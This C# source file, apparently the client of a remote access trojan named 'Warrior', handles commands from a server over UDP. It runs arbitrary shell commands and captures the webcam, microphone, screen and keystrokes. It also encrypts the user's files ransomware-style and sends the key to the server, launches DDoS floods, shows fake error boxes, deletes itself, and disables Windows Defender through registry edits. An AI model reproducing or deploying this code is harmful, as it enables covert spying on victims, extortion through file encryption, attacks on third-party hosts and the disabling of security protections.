using AForge.Video.DirectShow;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using System.Management;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace Warrior
{

    class Commands
    {
        // this is the class for all commands that the server can send and we can finalize.
        VideoCaptureDevice cam;
        public void RunCommand(string command, UdpClient client)
        {
            if (!string.IsNullOrEmpty(command)) { }

            if (command == "getip")
            {
                string GetIp()
                {
                    var Client = new WebClient();
                    var getdata = Client.DownloadString("https://ifconfig.co/json");
                    return getdata;
                }
                var data = Encoding.UTF8.GetBytes(GetIp());

                client.Send(data, data.Length);
            }
            else if (command == "areyoualive")
            {
                var data = Encoding.UTF8.GetBytes("iamalive");
                client.Send(data, data.Length);
            }
            else if (command == "getcpu")
            {

                float GetCpuUsage()
                {
                    var searcher = new ManagementObjectSearcher("select LoadPercentage from Win32_Processor");
                    foreach (var obj in searcher.Get())
                    {
                        return float.Parse(obj["LoadPercentage"].ToString());
                    }
                    return 0;
                }
                var data = Encoding.UTF8.GetBytes($"commandR=Current CPU Usage is {GetCpuUsage()}");
                client.Send(data, data.Length);
            }
            else if (command == "getram")
            {
                float GetRamUsage()
                {
                    var searcher = new ManagementObjectSearcher(
                        "SELECT TotalVisibleMemorySize, FreePhysicalMemory FROM Win32_OperatingSystem");

                    foreach (ManagementObject obj in searcher.Get())
                    {
                        float total = float.Parse(obj["TotalVisibleMemorySize"].ToString());
                        float free = float.Parse(obj["FreePhysicalMemory"].ToString());

                        return ((total - free) / total) * 100f;
                    }

                    return 0;
                }
                var data = Encoding.UTF8.GetBytes($"commandR=Current Ram Usage is {GetRamUsage()}");
                client.Send(data, data.Length);
            }
            else if (command == "networkinfo")
            {

                string GetNetworkInfo()
                {
                    var sb = new StringBuilder();

                    foreach (var ni in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
                    {
                        if (ni.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up)
                            continue;

                        if (ni.NetworkInterfaceType == System.Net.NetworkInformation.NetworkInterfaceType.Loopback)
                            continue;

                        sb.AppendLine($"Name: {ni.Name}");
                        sb.AppendLine($"Description: {ni.Description}");
                        sb.AppendLine($"Type: {ni.NetworkInterfaceType}");
                        sb.AppendLine($"Speed: {ni.Speed / 1_000_000} Mbps");
                        sb.AppendLine($"MAC: {ni.GetPhysicalAddress()}");

                        var ipProps = ni.GetIPProperties();
                        var ipv4 = ipProps.UnicastAddresses
                            .FirstOrDefault(a => a.Address.AddressFamily == AddressFamily.InterNetwork);

                        if (ipv4 != null)
                            sb.AppendLine($"IPv4: {ipv4.Address}");

                        sb.AppendLine();
                    }

                    return sb.ToString().Trim();
                }
                var data = Encoding.UTF8.GetBytes($"commandR=Current Network Info:\n{GetNetworkInfo()}");
                client.Send(data, data.Length);
            }
            else if (command == "listpr")
            {
                string ListProcesses()
                {
                    var sb = new StringBuilder();

                    foreach (var p in Process.GetProcesses())
                    {
                        sb.AppendLine($"{p.ProcessName}  (PID: {p.Id})");
                    }

                    return sb.ToString();
                }
                var data = Encoding.UTF8.GetBytes($"commandR=Here is a list of processes\n{ListProcesses()}");
                client.Send(data, data.Length);

            }
            else if (command == "shutdown")
            {
                void ShutdownPC()
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "shutdown",
                        Arguments = "/s /t 0",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });
                }
                var data = Encoding.UTF8.GetBytes("commandR=The Client will be ShutDown");
                client.Send(data, data.Length);
                ShutdownPC();
            }
            else if (command == "webcam")
            {
                new Thread(() =>
                {
                    byte[] TakeWebcamPictureBytes()
                    {
                        byte[] imageBytes = null;

                        var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                        var cam = new VideoCaptureDevice(devices[0].MonikerString);

                        cam.NewFrame += (s, e) =>
                        {
                            using var bmp = new Bitmap(e.Frame, new Size(700, 500));
                            using var ms = new MemoryStream();

                            var encoder = ImageCodecInfo.GetImageEncoders()
                                .First(c => c.FormatID == ImageFormat.Jpeg.Guid);

                            var encParams = new EncoderParameters(1);
                            encParams.Param[0] = new EncoderParameter(
                                System.Drawing.Imaging.Encoder.Quality, 65L); 

                            bmp.Save(ms, encoder, encParams);
                            imageBytes = ms.ToArray();

                            cam.SignalToStop();
                        };

                        cam.Start();
                        while (cam.IsRunning && imageBytes == null)
                            Thread.Sleep(10);

                        return imageBytes;
                    }
                    string base64String = Convert.ToBase64String(TakeWebcamPictureBytes());

                    var data = Encoding.UTF8.GetBytes($"commandP={base64String}");
                    client.Send(data, data.Length);
                }).Start();
            }
            else if (command.Contains("runcmd="))
            {
                new Thread(() =>
                {
                    string RunCmd(string cmd)
                    {
                        using var p = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + cmd)
                        {
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        });
                        return p.StandardOutput.ReadToEnd();
                    }

                    var com = command.Replace("runcmd=", "");
                    var data = Encoding.UTF8.GetBytes($"cmdresponse=Command Output:\n{RunCmd(com)}");
                    client.Send(data, data.Length);
                }).Start();

            }
            else if (command.Contains("fileupload="))
            {
                var data = command.Replace("fileupload=", "");
                void SaveBase64File(string data)
                {
                    var parts = data.Split('|');
                    if (parts.Length != 2) return;

                    string fileName = parts[0];
                    byte[] bytes = Convert.FromBase64String(parts[1]);

                    string savePath = Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                        fileName
                    );

                    System.IO.File.WriteAllBytes(savePath, bytes);

                }
                SaveBase64File(data);

            }
            else if (command == "recaudio")
            {
                new Thread(() =>
                {
                    string RecordMicBase64_Small(int seconds)
                    {
                        var waveIn = new NAudio.Wave.WaveInEvent
                        {
                            DeviceNumber = 0,
                            WaveFormat = new NAudio.Wave.WaveFormat(8000, 8, 1), 
                            BufferMilliseconds = 100
                        };

                        var ms = new MemoryStream();
                        var writer = new NAudio.Wave.WaveFileWriter(ms, waveIn.WaveFormat);

                        waveIn.DataAvailable += (s, e) =>
                            writer.Write(e.Buffer, 0, e.BytesRecorded);

                        waveIn.StartRecording();
                        Thread.Sleep(seconds * 1000);
                        waveIn.StopRecording();

                        writer.Flush();
                        writer.Dispose();
                        waveIn.Dispose();

                        return Convert.ToBase64String(ms.ToArray());
                    }
                    var audio = RecordMicBase64_Small(5);
                    var data = Encoding.UTF8.GetBytes($"audio={audio}");
                    client.Send(data, data.Length);
                    Console.WriteLine("sent data");
                }).Start();
            }
            else if (command == "screenshot")
            {
                byte[] TakeScreenshotBytes()
                {
                    int x = GetSystemMetrics(76);
                    int y = GetSystemMetrics(77);
                    int w = GetSystemMetrics(78);
                    int h = GetSystemMetrics(79);

                    using var bmp = new Bitmap(w, h);
                    using (Graphics g = Graphics.FromImage(bmp))
                    {
                        g.CopyFromScreen(x, y, 0, 0, bmp.Size);
                    }

                    // Save as JPG
                    var encoder = ImageCodecInfo.GetImageEncoders()
                        .First(e => e.FormatID == ImageFormat.Jpeg.Guid);

                    var encParams = new EncoderParameters(1);
                    encParams.Param[0] = new EncoderParameter(
                        System.Drawing.Imaging.Encoder.Quality, 80L);

                    using var ms = new MemoryStream();
                    bmp.Save(ms, encoder, encParams);

                    return ms.ToArray();
                }


                [DllImport("user32.dll")]
                static extern int GetSystemMetrics(int nIndex);

                byte[] img = TakeScreenshotBytes();

                const int CHUNK = 60000; 
                string id = Guid.NewGuid().ToString("N");

                int total = (int)Math.Ceiling((double)img.Length / CHUNK);

                for (int i = 0; i < total; i++)
                {
                    int len = Math.Min(CHUNK, img.Length - i * CHUNK);

                    string header = $"IMG|{id}|{i}|{total}|";
                    byte[] headerBytes = Encoding.ASCII.GetBytes(header);

                    byte[] packet = new byte[headerBytes.Length + len];

                    Buffer.BlockCopy(headerBytes, 0, packet, 0, headerBytes.Length);
                    Buffer.BlockCopy(img, i * CHUNK, packet, headerBytes.Length, len);

                    client.Send(packet, packet.Length);
                }

            }
            else if (command.Contains("openurl("))
            {
                new Thread(() =>
                {
                    var data = command.Split("(");
                    Process.Start(new ProcessStartInfo("cmd.exe", $"/c start {data[1]}"));
                }).Start();
            }
            else if (command.Contains("killpr="))
            {
                var pr = command.Split("=");
                try
                {
                    var a = Process.GetProcessById(Convert.ToInt32(pr[1]));
                    a.Kill();
                    client.Send(Encoding.UTF8.GetBytes($"commandR=Killed Procees {pr[1]}"));
                }
                catch { }

            }
            else if (command.Contains("fakerr="))
            {
                new Thread(() =>
                {
                    var pr = command.Split("=");
                    var prpr = pr[1].Split("|");
                    var title = prpr[0];
                    var description = prpr[1];
                    void FakeGuiError()
                    {
                        MessageBoxW(
                            IntPtr.Zero,
                            description,
                            title,
                            0x10
                        );
                    }

                    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
                    static extern int MessageBoxW(
                        IntPtr hWnd,
                        string text,
                        string caption,
                        uint type
                    );
                    FakeGuiError();
                }).Start();
            }
            else if (command == "keylog")
            {
                var start = DateTime.Now;
                var c = new Warrior.GlobalKey();
                c.Init();

                while ((DateTime.Now - start).TotalMinutes < 2)
                {
                    var key = c.CurrentKey();
                    if (key != null)
                    {
                        if (key.ToLower() == "spacebar")
                        {
                            var dat = Encoding.UTF8.GetBytes($"keystr= ");
                            client.Send(dat, dat.Length);
                        }
                        else if (key.ToLower() == "backspace")
                        {

                        }
                        else if (key.ToLower() == "tab")
                        {

                        }
                        else if (key.ToLower() == "enter")
                        {
                            var da = Encoding.UTF8.GetBytes($"keystr=\n");
                            client.Send(da, da.Length);
                        }
                        else
                        {
                            var data = Encoding.UTF8.GetBytes($"keystr={key.ToLower()}");
                            client.Send(data, data.Length);
                        }
                    }
                }
            }
            else if (command == "encrypt")
            {
                List<string> files = new List<string>();
                string[] list =
                {
                ".txt", ".log", ".csv",
                ".json", ".xml", ".yaml", ".yml",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg",
                ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".zip", ".rar", ".7z", ".tar", ".gz",
                ".mp3", ".wav", ".ogg", ".flac",
                ".mp4", ".mkv", ".avi", ".mov",
                ".html", ".htm", ".css", ".js",
                ".ini", ".cfg", ".conf"
            };

                void Walk(string dir)
                {
                    try
                    {
                        foreach (var f in Directory.GetFiles(dir))
                            if (list.Contains(Path.GetExtension(f), StringComparer.OrdinalIgnoreCase))
                                try { Encrypt(f); } catch { }

                        foreach (var d in Directory.GetDirectories(dir))
                            if (!d.EndsWith(@"\AppData", StringComparison.OrdinalIgnoreCase))
                                Walk(d);
                    }
                    catch { }
                }



                string GetKey()
                {
                    string[] list =
                    {
                // lowercase letters
                    "a","b","c","d","e","f","g","h","i","j","k","l","m",
                    "n","o","p","q","r","s","t","u","v","w","x","y","z",

                    // uppercase letters
                    "A","B","C","D","E","F","G","H","I","J","K","L","M",
                    "N","O","P","Q","R","S","T","U","V","W","X","Y","Z",

                    // numbers
                    "0","1","2","3","4","5","6","7","8","9"
                };
                    string i = "";
                    var r = new Random();
                    for (int j = 0; j < 16; j++)
                    {
                        var nextl = r.Next(0, 56);
                        i += list[nextl];
                    }
                    return i;
                }
                var k = Encoding.UTF8.GetBytes(GetKey());
                var xk = Encoding.UTF8.GetBytes(GetKey());

                void Encrypt(string path)
                {
                    List<byte> data = new List<byte>();

                    using (var fsopen = System.IO.File.Open(path, FileMode.Open, FileAccess.ReadWrite))
                    {

                        int bb;
                        while ((bb = fsopen.ReadByte()) != -1)
                        {
                            data.Add(Convert.ToByte(bb));
                        }
                        fsopen.Close();
                    }
                    using (var fsstream = new FileStream(path, FileMode.Open, FileAccess.Write))
                    {

                        using (var a = new RijndaelManaged())
                        {
                            using (var en = a.CreateEncryptor(k, xk))
                            {
                                using (var v = new CryptoStream(fsstream, en, CryptoStreamMode.Write))
                                {
                                    foreach (byte b in data)
                                    {
                                        v.WriteByte(b);
                                    }
                                }
                            }
                        }
                        fsstream.Close();
                    }

                    files.Add(Path.GetFileName(path));
                }
                Walk(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
                var da = Encoding.UTF8.GetBytes($"commandR=Encrpytion KEY:{k}\n Encryption IV: {xk} \n ENCRYPTED FILES LIST: \n{files}");

                client.Send(da, da.Length);

            }
            else if (command.Contains("decrypt="))
            {
                var a = command.Split('=');
                var b = a[1].Split("|");

                var k = Encoding.UTF8.GetBytes(b[0]);
                var xk = Encoding.UTF8.GetBytes(b[1]);


                List<string> files = new List<string>();
                string[] list =
                {
                ".txt", ".log", ".csv",
                ".json", ".xml", ".yaml", ".yml",
                ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".webp", ".svg",
                ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
                ".zip", ".rar", ".7z", ".tar", ".gz",
                ".mp3", ".wav", ".ogg", ".flac",
                ".mp4", ".mkv", ".avi", ".mov",
                ".html", ".htm", ".css", ".js",
                ".ini", ".cfg", ".conf"
            };

                void Walk(string dir)
                {
                    try
                    {
                        foreach (var f in Directory.GetFiles(dir))
                            if (list.Contains(Path.GetExtension(f), StringComparer.OrdinalIgnoreCase))
                                try { Decrypt(f); } catch { }

                        foreach (var d in Directory.GetDirectories(dir))
                            if (!d.EndsWith(@"\AppData", StringComparison.OrdinalIgnoreCase))
                                Walk(d);
                    }
                    catch { }
                }
                void Decrypt(string path)
                {
                    List<byte> data = new List<byte>();

                    using (var fsopen = System.IO.File.Open(path, FileMode.Open, FileAccess.ReadWrite))
                    {

                        int bb;
                        while ((bb = fsopen.ReadByte()) != -1)
                        {
                            data.Add(Convert.ToByte(bb));
                        }
                        fsopen.Close();
                    }
                    using (var fsstream = new FileStream(path, FileMode.Open, FileAccess.Write))
                    {

                        using (var a = new RijndaelManaged())
                        {
                            using (var en = a.CreateDecryptor(k, xk))
                            {
                                using (var v = new CryptoStream(fsstream, en, CryptoStreamMode.Write))
                                {
                                    foreach (byte b in data)
                                    {
                                        v.WriteByte(b);
                                    }
                                }
                            }
                        }
                        fsstream.Close();
                    }

                    files.Add(Path.GetFileName(path));
                }
                Walk(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));

            }
            else if (command.Contains("ddos="))
            {
                var a = command.Split('=');
                var b = a[1].Split("|");
                var ip = b[0];
                var c = b[1];
                var d = c.Split("%");
                var port = d[0];
                var duration = d[1];
                new Warrior.Dos().Startddos(ip, Convert.ToInt32(port), Convert.ToInt32(duration));
                var data = Encoding.UTF8.GetBytes("commandR= DDos Has Started on client " + Environment.MachineName);
                client.Send(data, data.Length);
            }
            else if (command == "selfd")
            {
                static void SelfDestruct()
                {
                    string currentPath = AppDomain.CurrentDomain.BaseDirectory;
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    string batPath = Path.Combine(currentPath, "selfdestruct.bat");

                    string batContent = $@"
                                :loop
                                del ""{exePath}""
                                if exist ""{exePath}"" goto loop
                                del ""{batPath}""
                                ";
                    File.WriteAllText(batPath, batContent);

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = batPath,
                        CreateNoWindow = true,
                        UseShellExecute = false
                    });

                    Environment.Exit(0);
                }
                SelfDestruct();
            }
            else if (command == "disables")
            {
                void Disable()
                {

                    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        return;
                    };

                    RegistryEdit(@"SOFTWARE\Microsoft\Windows Defender\Features", "TamperProtection", "0");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableBehaviorMonitoring", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableOnAccessProtection", "1");
                    RegistryEdit(@"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");


                }

                void RegistryEdit(string regPath, string name, string value)
                {
                    try
                    {
                        using (RegistryKey key = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                        {
                            if (key == null)
                            {
                                Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                                return;
                            }
                            if (key.GetValue(name) != (object)value)
                                key.SetValue(name, value, RegistryValueKind.DWord);
                        }
                    }
                    catch(Exception ex) { Console.WriteLine($"{ex}"); }
                }

                Disable();
                var data = Encoding.UTF8.GetBytes("Disabled the AV On the clients PC");
                client.Send(data, data.Length);
            }
        }


    }
}
